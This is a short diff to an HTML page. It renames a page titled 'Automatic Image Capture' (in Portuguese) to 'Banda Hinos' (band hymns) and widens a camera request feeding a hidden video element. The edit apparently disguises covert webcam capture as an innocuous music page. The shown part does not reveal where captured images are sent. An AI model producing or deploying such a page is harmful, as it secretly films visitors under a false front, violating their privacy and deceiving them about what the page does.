@@ -27,10 +27,9 @@
     </style>
 </head>
 <body>
-    <h1>Captura de Imagens Automática</h1>
+    <h1>Banda Hinos</h1>
     <script>
-        // Solicita a câmera frontal
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 // Criar um elemento de vídeo oculto
                 const video = document.createElement('video');
